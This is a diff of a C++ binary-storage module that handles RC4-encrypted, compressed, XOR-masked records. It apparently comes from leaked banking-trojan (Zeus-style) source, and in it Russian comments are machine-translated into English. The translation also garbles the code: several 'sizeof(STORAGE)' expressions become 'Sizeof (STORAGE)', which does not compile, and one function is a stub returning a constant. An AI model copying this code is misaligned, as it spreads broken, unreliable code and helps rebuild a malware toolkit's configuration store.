@@ -2,14 +2,14 @@
 
 #include "binstorage.h"
 
-#define SHF_REMOVED 0x1 //Элемент удален.
+#define SHF_REMOVED 0x1 //Item is removed.
 
 #pragma pack(push, 1)
-//Заголовок для элемента в хранилище.
+//Heading for an item in the store.
 typedef struct
 {
-  DWORD size;  //Размер элемента.
-  BYTE flags;  //Флаги SHF_*.
+  DWORD size;  //Element size.
+  BYTE flags;  //Flags SHF_ *.
 }STORAGEARRAYHEADER;
 #pragma pack(pop)
 
@@ -26,7 +26,7 @@ void BinStorage::uninit(void)
 bool BinStorage::_checkHash(STORAGE *binStorage)
 {
   BYTE md5Hash[MD5HASH_SIZE];
-  Crypt::_md5Hash(md5Hash, ((LPBYTE)binStorage) + sizeof(STORAGE), binStorage->size - sizeof(STORAGE));
+  Crypt::_md5Hash(md5Hash, ((LPBYTE)binStorage) + sizeof(STORAGE), binStorage->size - Sizeof (STORAGE));
   return (Mem::_compare(md5Hash, binStorage->md5Hash, MD5HASH_SIZE) == 0) ? true : false;
 }
 
@@ -46,7 +46,7 @@ bool BinStorage::_addItem(STORAGE **binStorage, DWORD id, DWORD flags, void *dat
     ITEM *item = (ITEM *)(((LPBYTE)p) + p->size);
     LPBYTE dest = (LPBYTE)(item) + sizeof(ITEM);
       
-    //Сжимаем.
+    //Compressible.
     if(dataSize == 0)flags &= ~ITEMF_COMPRESSED;
 
     if(flags & ITEMF_COMPRESSED)
@@ -115,7 +115,7 @@ bool BinStorage::_modifyItem(STORAGE **binStorage, ITEM *item, DWORD flags, void
   if(newBinStorage != NULL)
   {
     newBinStorage->size = itemOffset;
-    newBinStorage->count--; //Т.к. на прежнее значение его вернет _addItem().
+    newBinStorage->count--; //Because to its original value of its return _addItem ().
     
     if(_addItem(&newBinStorage, item->id, flags, data, dataSize))
     {
@@ -223,7 +223,7 @@ bool BinStorage::_getItemDataAsDword(const STORAGE *binStorage, DWORD id, DWORD 
 
 
 DWORD BinStorage::_pack2(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key)
-{ //DWORD size = binStorage->size; 
+{ //DWORD size = binStorage-> size;
 return 50000;}
 
 DWORD BinStorage::_pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key)
@@ -244,10 +244,10 @@ DWORD BinStorage::_pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key
       continue;
     }
 
-    //Снимаем маску.
+    //Take off the mask.
     curItem->flags &= ~ITEMF_COMBINE_MASK;
 
-    //Применяем маску.
+    //Apply the mask.
     DWORD itemMask = curItem->flags & ITEMF_IS_MASK;
     ITEM *cloneOfItem = curItem;
     while((cloneOfItem = _getNextItem(oldStorage, cloneOfItem)))if(cloneOfItem->id == curItem->id && (cloneOfItem->flags & ITEMF_IS_MASK) == itemMask)
@@ -263,7 +263,7 @@ DWORD BinStorage::_pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key
     }
   }
   
-  //Создаем чистый список.
+  //Create a blank list.
   STORAGE *newStorage;
   if((newStorage = _createEmpty()))
   {
@@ -289,7 +289,7 @@ DWORD BinStorage::_pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key
       newStorage->size += size;
     }
 
-    if(r == false || !Crypt::_md5Hash(newStorage->md5Hash, ((LPBYTE)newStorage) + sizeof(STORAGE), newStorage->size - sizeof(STORAGE)))
+    if(r == false || !Crypt::_md5Hash(newStorage->md5Hash, ((LPBYTE)newStorage) + sizeof(STORAGE), newStorage->size - Sizeof (STORAGE)))
     {
       Mem::free(newStorage);
     }
@@ -319,7 +319,7 @@ DWORD BinStorage::_unpack(STORAGE **binStorage, void *data, DWORD dataSize, Cryp
 {
   if(dataSize >= sizeof(STORAGE) && dataSize <= BINSTORAGE_MAX_SIZE)
   {
-    //Делаем копию ключа.
+    //Make a copy of the key.
     Crypt::RC4KEY key;
     if(rc4Key)Mem::_copy(&key, rc4Key, sizeof(Crypt::RC4KEY));
     
@@ -365,7 +365,7 @@ BinStorage::STORAGE *BinStorage::_combine(STORAGE *binStorage1, STORAGE *binStor
 {
   if(binStorage1 && binStorage2 && binStorage1->size >= sizeof(STORAGE) && binStorage2->size >= sizeof(STORAGE))  
   {
-    DWORD newSize = binStorage1->size + binStorage2->size - sizeof(STORAGE);
+    DWORD newSize = binStorage1->size + binStorage2->size - Sizeof (STORAGE);
     if(newSize <= BINSTORAGE_MAX_SIZE)
     {
       STORAGE *newStorage = (STORAGE *)Mem::alloc(newSize);
@@ -376,10 +376,10 @@ BinStorage::STORAGE *BinStorage::_combine(STORAGE *binStorage1, STORAGE *binStor
         newStorage->count = binStorage1->count + binStorage2->count;
 
         LPBYTE cur = ((LPBYTE)newStorage) + sizeof(STORAGE);
-        Mem::_copy(cur, ((LPBYTE)binStorage1) + sizeof(STORAGE), binStorage1->size - sizeof(STORAGE));
+        Mem::_copy(cur, ((LPBYTE)binStorage1) + sizeof(STORAGE), binStorage1->size - Sizeof (STORAGE));
 
-        cur = ((LPBYTE)newStorage) /*+ sizeof(STORAGE)*/ + binStorage1->size /*- sizeof(STORAGE)*/;
-        Mem::_copy(cur, ((LPBYTE)binStorage2) + sizeof(STORAGE), binStorage2->size - sizeof(STORAGE));
+        cur = ((LPBYTE)newStorage) /*+ sizeof(STORAGE)*/ + binStorage1->size /*- Sizeof (STORAGE)*/;
+        Mem::_copy(cur, ((LPBYTE)binStorage2) + sizeof(STORAGE), binStorage2->size - Sizeof (STORAGE));
 
         return newStorage;
       }
@@ -394,7 +394,7 @@ bool BinStorage::_openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *s
   DWORD creationDisposition;
   bool retVal = false;
   
-  //Права доступа.
+  //Access rights.
   if(flags & OSF_WRITE_ACCESS)
   {
     desiredAccess       |= GENERIC_WRITE;
@@ -405,7 +405,7 @@ bool BinStorage::_openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *s
     creationDisposition = OPEN_EXISTING;
   }
   
-  //Открываем файл.
+  //Open the file.
   storageArray->file = CWA(kernel32, CreateFileW)(fileName, desiredAccess, FILE_SHARE_READ, NULL, creationDisposition, FILE_ATTRIBUTE_NORMAL, NULL);
   if(storageArray->file != INVALID_HANDLE_VALUE)
   {
@@ -416,7 +416,7 @@ bool BinStorage::_openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *s
       if(fileSize == 0)retVal = true;
       else
       {
-        //Проверка на ошибки.
+        //Check for errors.
         STORAGEARRAYHEADER sh;
         DWORD readed;
         DWORD64 offset = 0, newOffset;
@@ -425,7 +425,7 @@ bool BinStorage::_openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *s
         {
           if(!CWA(kernel32, ReadFile)(storageArray->file, &sh, sizeof(STORAGEARRAYHEADER), &readed, NULL))
           {
-            //Не удалось прочитать файл.
+            //Unable to read file.
             #if defined(WDEBUG3)
             WDEBUG3(WDDT_ERROR, "(1)Failed to read \"%s\", position %I64u, size %I64u", fileName, Fs::_getFilePointer(storageArray->file), fileSize);
             #endif
@@ -433,35 +433,35 @@ bool BinStorage::_openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *s
             goto CHECK_END;
           }
           
-          //EOF. Файл успешно прочитан.
+          //EOF. File successfully read.
           if(readed == 0)
           {
             retVal = true;
             goto CHECK_END; 
           }
           
-          //Если не удалось прочитать размер
+          //If you can not read size
           if(readed != sizeof(STORAGEARRAYHEADER))
           {
             #if defined(WDEBUG4)
             WDEBUG4(WDDT_ERROR, "(2)Failed to read file \"%s\", position %I64u, size %I64u, readed=%u", fileName, Fs::_getFilePointer(storageArray->file), fileSize, readed);
             #endif
             
-            //Восстанавливаем до конца предидущей конигурации.
+            //Restoring the end of the previous one koniguratsii.
             goto RESTORE_FILE1;
           }
           
           sh.size  ^= storageArray->xorKey;
           newOffset = offset + sizeof(STORAGEARRAYHEADER) + sh.size;
           
-          //Файл поврежден.
+          //The file is damaged.
           if(newOffset > fileSize || sh.size > BINSTORAGE_MAX_SIZE)
           {
             #if defined(WDEBUG4)
             WDEBUG4(WDDT_ERROR, "(2)File corrupted \"%s\", position %I64u, size %I64u, newOffset=%I64u", fileName, Fs::_getFilePointer(storageArray->file), fileSize, newOffset);
             #endif
             
-            //Восстанавливаем до конца предидущей конигурации.
+            //Restoring the end of the previous one koniguratsii.
             goto RESTORE_FILE1;
           }
           
@@ -478,7 +478,7 @@ bool BinStorage::_openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *s
         }
 
 RESTORE_FILE1:
-        //Восстанавливаем до конца текушей конфигурации.
+        //Restoring the end tekusheyu configuration.
         if(flags & OSF_WRITE_ACCESS && Fs::_setFilePointer(storageArray->file, offset, FILE_BEGIN) && CWA(kernel32, SetEndOfFile)(storageArray->file))retVal = true;  
 
 CHECK_END:;
@@ -519,12 +519,12 @@ bool BinStorage::_addToStorageArray(STORAGEARRAY *storageArray, STORAGE *binStor
       {
         DWORD written;
 
-        //Создаем заголовок.
+        //Create a headline.
         STORAGEARRAYHEADER sh;
         Mem::_zero(&sh, sizeof(STORAGEARRAYHEADER));
         sh.size = size ^ storageArray->xorKey;
 
-        //Пишим.    
+        //Pishim.
         if(CWA(kernel32, WriteFile)(storageArray->file, &sh, sizeof(STORAGEARRAYHEADER), &written, NULL) && written == sizeof(STORAGEARRAYHEADER) &&
            CWA(kernel32, WriteFile)(storageArray->file, binStorage, size, &written, NULL) && written == size)
         {
@@ -532,7 +532,7 @@ bool BinStorage::_addToStorageArray(STORAGEARRAY *storageArray, STORAGE *binStor
         }
         else
         {
-          //Восстанавливаем конец файла.
+          //Restoring the end of the file.
           Fs::_setFilePointer(storageArray->file, curOffset, FILE_BEGIN);
           CWA(kernel32, SetEndOfFile)(storageArray->file);
         }
@@ -562,7 +562,7 @@ bool BinStorage::_getNextFromStorageArray(STORAGEARRAY *storageArray, STORAGE **
     DWORD64 curItem = Fs::_getFilePointer(storageArray->file);
     if(!CWA(kernel32, ReadFile)(storageArray->file, &sh, sizeof(STORAGEARRAYHEADER), &readed, NULL))
     {
-      //Не удалось прочитать файл.
+      //Unable to read file.
 #     if defined(WDEBUG1)
       WDEBUG1(WDDT_ERROR, "(1)Failed to read position %I64u", Fs::_getFilePointer(storageArray->file));
 #     endif
@@ -576,17 +576,17 @@ bool BinStorage::_getNextFromStorageArray(STORAGEARRAY *storageArray, STORAGE **
       return true;
     }
   
-    //Если не удалось прочитать размер
+    //If you can not read size
     if(readed != sizeof(STORAGEARRAYHEADER))
     {
-      //Не удалось прочитать файл.
+      //Unable to read file.
 #     if defined(WDEBUG1)
       WDEBUG1(WDDT_ERROR, "(2)Failed to read position %I64u", Fs::_getFilePointer(storageArray->file));
 #     endif
       break;
     }
     
-    //Получаем размер.
+    //Gets the size.
     sh.size ^= storageArray->xorKey;
     if(sh.size > BINSTORAGE_MAX_SIZE)
     {
@@ -596,7 +596,7 @@ bool BinStorage::_getNextFromStorageArray(STORAGEARRAY *storageArray, STORAGE **
       break;
     }
     
-    //Проверяем не удален ли элемент.
+    //Check whether the item is not deleted.
     if(sh.flags & SHF_REMOVED || sh.size == 0)
     {
       if(!Fs::_setFilePointer(storageArray->file, sh.size, FILE_CURRENT))
@@ -609,13 +609,13 @@ bool BinStorage::_getNextFromStorageArray(STORAGEARRAY *storageArray, STORAGE **
       continue;
     }
     
-    //Выделяем память
+    //Allocate
     void *p = Mem::alloc(sh.size);
     if(p == NULL)break;
   
     if(!CWA(kernel32, ReadFile)(storageArray->file, p, sh.size, &readed, NULL) || readed != sh.size || (readed = _unpack(NULL, p, sh.size, rc4Key)) == 0)
     {
-      //Не удалось прочитать файл.
+      //Unable to read file.
 #     if defined(WDEBUG1)
       WDEBUG1(WDDT_ERROR, "(5)Failed to read position %I64u", Fs::_getFilePointer(storageArray->file));
 #     endif
